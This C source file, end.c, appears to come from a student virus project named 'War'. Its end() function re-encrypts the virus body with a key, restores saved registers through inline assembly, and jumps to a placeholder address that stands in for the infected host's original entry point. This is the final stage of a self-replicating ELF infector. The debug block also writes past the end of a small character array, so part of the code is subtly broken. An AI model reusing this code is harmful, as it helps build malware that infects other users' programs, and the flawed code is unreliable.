/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   end.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:19:24 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/04 12:10:46 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void	end(t_data *data)
{
	revert_one(&data->key, (char*)release, (size_t)end - (size_t)release);

#ifdef DEBUG
	char de[] = "end\t \n";
	data->context == true ?	de[11] = 49 : 48;
	_write(1, de, _strlen(de));
#endif

	__asm__ __volatile__ (
		"mov	rsp, %0;"
		"pop	r15;"
		"pop	r14;"
		"pop	r13;"
		"pop	r12;"
		"pop	r11;"
		"pop	r10;"
		"pop	r9;"
		"pop	r8;"
		"pop	rcx;"
		"pop	rdx;"
		"pop	rsi;"
		"pop	rdi;"
		"pop	rax;"
		"pop	rbx;"
		"pop	rbp;"
		"pop	rsp;"
		"add	rsp, 0x8;"
		"jmp	0xcafeba;"
		:: "g"(data->rsp)
		);
}
